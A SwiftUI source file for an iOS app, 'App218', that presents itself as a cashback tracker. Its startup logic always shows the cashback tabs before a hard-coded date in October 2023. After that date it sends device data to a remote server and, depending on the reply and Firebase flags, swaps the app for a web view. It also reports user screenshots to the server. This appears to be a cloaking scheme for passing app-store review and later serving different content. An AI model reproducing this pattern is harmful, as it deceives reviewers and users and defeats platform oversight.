//
//  ContentView.swift
//  App218
//
//  Created by IGOR on 10/10/2023.
//

import SwiftUI
import Amplitude

struct ContentView: View {
    
    @State var current_tab: Tab = Tab.My_Cashback
    
    @State var server: String = ""
    
    @State var isDead: Bool = false
    @State var isContacts: Bool = false
    @State var isTelegram: Bool = false
    
    @State var telegram: URL = URL(string: "h")!
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg2")
                .ignoresSafeArea()
            
            if server.isEmpty || telegram.absoluteString == "h" {
                
                LoadingView()
                
            } else {
                
                if server == "0" {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        USplash(telegram: telegram, isTelegram: isTelegram, isContacts: isContacts)
                    }
                     
                } else if server == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                MyCashbackView()
                                    .tag(Tab.My_Cashback)
                                
                                Statistics()
                                    .tag(Tab.Statistics)
                                
                                CalculatorView()
                                    .tag(Tab.Calculator)
                                
                                ArchiveView()
                                    .tag(Tab.Archive)
                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {
                            
                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        RSplash()
                    }
                }
            }
        }
        .onAppear {
            
            check_data(isCaptured: false)
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.userDidTakeScreenshotNotification)) { _ in

            if server == "0" {
                
                check_data(isCaptured: true)
            }
        }
    }
    
    private func check_data(isCaptured: Bool) {
        
        getFirebaseData(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            getFirebaseData(field: "isTelegram", dataType: .bool) { result2 in
                
                let result2 = result2 as? Bool ?? false
                isTelegram = result2
            
                getFirebaseData(field: "telegram", dataType: .url) { result3 in
                    
                    let result3 = result3 as? URL ?? URL(string: "nil")!
                    telegram = result3
                    
                    getFirebaseData(field: "isContacts", dataType: .bool) { result4 in
                        
                        let result4 = result4 as? Bool ?? false
                        isContacts = result4
                        
                        let repository = RepositorySecond()
                        let myData = MyDataClass.getMyData()
                        let now = Date().timeIntervalSince1970

                        var dateComponents = DateComponents()
                        dateComponents.year = 2023
                        dateComponents.month = 10
                        dateComponents.day = 22

                        let targetDate = Calendar.current.date(from: dateComponents)!
                        let targetUnixTime = targetDate.timeIntervalSince1970
                        
                        guard now > targetUnixTime else {

                            server = "1"

                            return
                        }
                        
                        repository.post(isCaptured: isCaptured, isCast: false, mydata: myData) { result in
                            
                            switch result {
                            case .success(let data):
                                if "\(data)" == "" {
                                    
                                    self.server = "1"
                                    
                                } else {
                                    
                                    self.server = "\(data)"
                                }
                                
                            case .failure(_):
                                
                                if self.isDead == true {
                                    
                                    self.server = "0"
                                    
                                } else {
                                    
                                    self.server = "1"
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
